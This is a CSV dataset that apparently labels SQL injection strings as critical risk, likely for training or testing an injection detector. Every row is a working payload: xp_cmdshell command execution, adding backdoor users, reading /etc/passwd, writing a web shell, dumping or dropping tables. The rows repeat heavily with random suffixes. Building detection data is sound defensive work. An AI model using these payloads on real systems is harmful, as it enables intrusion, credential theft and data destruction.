query,risk,score
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # p,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # a,critical,100
'; SELECT load_file('/etc/passwd'); # # h,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 7,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # o,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; SELECT * FROM mysql.user; -- # c,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # r",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # u,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # n,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # n,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 2,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # y,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 4",critical,100
"' UNION SELECT username, password FROM users /**/ /* # b",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # y,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # p,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # p,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # m",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # t,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 7,critical,100
'; SELECT load_file('/etc/passwd'); # # l,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # x,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # y,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 3,critical,100
'; SELECT * FROM mysql.user; -- # l,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # l,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # c,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; SELECT * FROM mysql.user; -- # v,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 3,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # c,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # i,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 1",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # c",critical,100
'; DROP TABLE users; -- /* test */ # u,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # 6,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # v,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # k",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # u,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # x,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # y,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # n,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # k,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 8,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # u,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # x,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # p,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 7,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 6,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # k,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # t,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # t,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # d,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # k,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # i,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # e,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # i,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 3,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # g,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # 4,critical,100
'; SELECT * FROM mysql.user; -- # b,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 9,critical,100
'; SELECT load_file('/etc/passwd'); # # w,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # j,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # g,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # o,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # y",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 2,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # 9,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # n,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # e,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 8",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # g,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 1,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # b,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # v,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # m,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # o,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; SELECT load_file('/etc/passwd'); # # 3,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 7,critical,100
'; DROP TABLE users; -- /* test */ # g,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # b,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # 4,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # u,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # s,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # 8,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 8,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 4,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # 3,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 6,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # w",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 2,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 9,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # b,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # n,critical,100
'; DROP TABLE users; -- /* test */ # 3,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # f,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # u,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # i,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; DROP TABLE users; -- /* test */ # v,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # u,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # a",critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 1,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # q,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # s,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # f",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- # 9,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # u,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # v",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; DROP TABLE users; -- /* test */ # 0,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
'; SELECT * FROM mysql.user; -- -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- ",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # m",critical,100
'; DROP TABLE users; -- /* test */ -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 7,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 1,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # y,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # b,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # u",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # p,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # i,critical,100
'; SELECT load_file('/etc/passwd'); # -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # v",critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # e,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # a,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- ,critical,100
'; SELECT * FROM mysql.user; -- # d,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # m,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # 6,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- ,critical,100
